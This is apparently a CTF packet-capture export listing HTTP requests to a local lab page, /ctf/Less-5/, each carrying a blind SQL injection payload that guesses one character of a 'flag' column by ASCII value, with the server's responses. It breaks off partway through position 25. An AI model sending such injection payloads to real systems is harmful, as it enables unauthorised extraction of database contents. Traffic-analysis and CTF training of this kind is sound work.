"No.","Time","Source","Destination","Protocol","Length","Info"
"18923","8.613159080","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=80--+ HTTP/1.1 "
"18926","8.615190865","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18935","8.617340327","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=81--+ HTTP/1.1 "
"18938","8.619630897","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18947","8.622008790","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=82--+ HTTP/1.1 "
"18950","8.624135262","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18959","8.626365921","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=83--+ HTTP/1.1 "
"18962","8.628410989","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18971","8.630821400","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=84--+ HTTP/1.1 "
"18974","8.633086852","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18983","8.635679282","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=85--+ HTTP/1.1 "
"18986","8.638083767","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"18995","8.640335137","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=86--+ HTTP/1.1 "
"18998","8.642388795","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19007","8.644733240","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=87--+ HTTP/1.1 "
"19010","8.646726681","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19019","8.649057779","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=88--+ HTTP/1.1 "
"19022","8.651125965","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19031","8.653500377","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=89--+ HTTP/1.1 "
"19034","8.655492094","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19043","8.657848780","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=90--+ HTTP/1.1 "
"19046","8.659866896","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19055","8.662205545","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=91--+ HTTP/1.1 "
"19058","8.664226677","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19067","8.666495372","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=92--+ HTTP/1.1 "
"19070","8.668524390","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19079","8.670908328","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=93--+ HTTP/1.1 "
"19082","8.672922897","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19091","8.675362755","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=94--+ HTTP/1.1 "
"19094","8.677594109","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19103","8.680250517","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=95--+ HTTP/1.1 "
"19106","8.682495524","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19115","8.684775842","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=96--+ HTTP/1.1 "
"19118","8.686350645","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19127","8.688952273","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=97--+ HTTP/1.1 "
"19130","8.691412163","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19139","8.693918173","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=98--+ HTTP/1.1 "
"19142","8.695959248","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19151","8.698292407","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=99--+ HTTP/1.1 "
"19154","8.700336140","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19163","8.702678307","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=100--+ HTTP/1.1 "
"19166","8.704884997","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19175","8.707167914","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=101--+ HTTP/1.1 "
"19178","8.709311422","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19187","8.711573861","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=102--+ HTTP/1.1 "
"19190","8.713594076","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19199","8.715829751","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=103--+ HTTP/1.1 "
"19202","8.717817008","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19211","8.720094743","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=104--+ HTTP/1.1 "
"19214","8.722221464","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19223","8.724696929","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=105--+ HTTP/1.1 "
"19226","8.727062068","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19235","8.729331976","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=106--+ HTTP/1.1 "
"19238","8.731646092","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19247","8.734002714","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=107--+ HTTP/1.1 "
"19250","8.736109539","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19259","8.737770241","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=108--+ HTTP/1.1 "
"19262","8.740009871","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19271","8.742566843","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=109--+ HTTP/1.1 "
"19274","8.744561189","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19283","8.747009870","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=110--+ HTTP/1.1 "
"19286","8.749249144","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19295","8.751870953","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=111--+ HTTP/1.1 "
"19298","8.754118351","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19307","8.756375504","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=112--+ HTTP/1.1 "
"19310","8.758412867","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19319","8.760841590","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=113--+ HTTP/1.1 "
"19322","8.762855566","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19331","8.765396651","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=114--+ HTTP/1.1 "
"19334","8.767661361","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19343","8.770154784","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=115--+ HTTP/1.1 "
"19346","8.772446589","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19355","8.775066556","192.168.246.23","192.168.246.1","HTTP","289","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),24,1))=116--+ HTTP/1.1 "
"19358","8.777398316","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"19367","8.780042211","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=33--+ HTTP/1.1 "
"19370","8.782344498","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19379","8.784862426","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=34--+ HTTP/1.1 "
"19382","8.786865876","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19391","8.789237912","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=35--+ HTTP/1.1 "
"19394","8.791227705","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19403","8.793752678","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=36--+ HTTP/1.1 "
"19406","8.795799562","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19415","8.798390665","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=37--+ HTTP/1.1 "
"19418","8.800437887","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19427","8.802787230","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=38--+ HTTP/1.1 "
"19430","8.804913795","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19439","8.808549871","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=39--+ HTTP/1.1 "
"19442","8.810686056","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19451","8.813081567","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=40--+ HTTP/1.1 "
"19454","8.815170374","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19463","8.817496181","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=41--+ HTTP/1.1 "
"19466","8.819732265","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19475","8.822389742","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=42--+ HTTP/1.1 "
"19478","8.824648257","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19487","8.826863259","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=43--+ HTTP/1.1 "
"19490","8.828973920","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19499","8.831461568","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=44--+ HTTP/1.1 "
"19502","8.833807546","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19511","8.841306627","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=45--+ HTTP/1.1 "
"19514","8.843542869","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19523","8.846367942","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=46--+ HTTP/1.1 "
"19526","8.848792577","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19535","8.851241390","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=47--+ HTTP/1.1 "
"19538","8.853279702","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19547","8.855943188","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=48--+ HTTP/1.1 "
"19550","8.858215981","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19559","8.860806432","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=49--+ HTTP/1.1 "
"19562","8.863014278","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19571","8.865826450","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=50--+ HTTP/1.1 "
"19574","8.868173118","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19583","8.870891138","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=51--+ HTTP/1.1 "
"19586","8.873090518","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19595","8.875819465","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=52--+ HTTP/1.1 "
"19598","8.878100888","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19607","8.881010598","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=53--+ HTTP/1.1 "
"19610","8.883200955","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19619","8.885687246","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=54--+ HTTP/1.1 "
"19622","8.887679053","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19631","8.889850316","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=55--+ HTTP/1.1 "
"19634","8.891906059","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19643","8.894268147","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=56--+ HTTP/1.1 "
"19646","8.896691417","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19655","8.899311438","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=57--+ HTTP/1.1 "
"19658","8.901484757","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19667","8.904187275","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=58--+ HTTP/1.1 "
"19670","8.906317589","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19679","8.909058354","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=59--+ HTTP/1.1 "
"19682","8.911266824","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19691","8.913696134","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=60--+ HTTP/1.1 "
"19694","8.915974152","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19703","8.918685812","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=61--+ HTTP/1.1 "
"19706","8.920850699","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19715","8.923187145","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=62--+ HTTP/1.1 "
"19718","8.925209892","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19727","8.927627998","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=63--+ HTTP/1.1 "
"19730","8.929852791","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19739","8.932308136","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=64--+ HTTP/1.1 "
"19742","8.934648785","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19751","8.937363876","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=65--+ HTTP/1.1 "
"19754","8.939620740","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19763","8.942299398","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=66--+ HTTP/1.1 "
"19766","8.944566947","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19775","8.947140395","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=67--+ HTTP/1.1 "
"19778","8.949111773","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19787","8.951772241","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=68--+ HTTP/1.1 "
"19790","8.954113148","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19799","8.956812064","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=69--+ HTTP/1.1 "
"19802","8.958860770","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19811","8.961508454","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=70--+ HTTP/1.1 "
"19814","8.963642863","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19823","8.966089533","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=71--+ HTTP/1.1 "
"19826","8.968369247","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19835","8.970807678","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=72--+ HTTP/1.1 "
"19838","8.972886106","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"19847","8.975260744","192.168.246.23","192.168.246.1","HTTP","288","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),25,1))=73--+ HTTP/1.1 "
